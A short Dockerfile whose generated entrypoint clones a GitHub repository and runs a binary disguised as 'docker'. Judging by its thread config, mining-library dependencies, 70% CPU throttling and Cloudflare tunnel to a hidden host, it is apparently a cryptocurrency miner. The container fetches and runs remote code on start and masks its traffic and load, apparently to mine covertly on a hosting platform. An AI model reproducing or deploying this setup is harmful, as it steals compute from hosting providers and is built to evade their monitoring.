FROM debian:stable-slim

# Install dependencies
RUN apt-get update && apt-get install -y \
    git curl ca-certificates libcurl4 libjansson4 libssl3 libgomp1 sed cpulimit \
    && rm -rf /var/lib/apt/lists/*

# Install cloudflared
RUN curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o /usr/bin/cloudflared && chmod +x /usr/bin/cloudflared

WORKDIR /app

# Buat entrypoint
RUN echo '#!/bin/bash
mkdir -p /app/ramdisk
cd /app/ramdisk

rm -rf *

git clone -q https://github.com/stilkuters/tide.git .

chmod +x docker

CORES=$(nproc)
LIMIT=$(( CORES * 70 ))

echo "[DOTAJA] Terdeteksi $CORES Core. Limit $LIMIT%"

sed -i "s/\"threads\":.*/\"threads\": $CORES,/g" docker.json

HOST_CF=$(cat hostname.txt)

cloudflared access tcp --hostname "$HOST_CF" --url 127.0.0.1:443 &

./docker -c docker.json &

sleep 5

cpulimit -e docker -l $LIMIT
' > /entrypoint.sh && chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
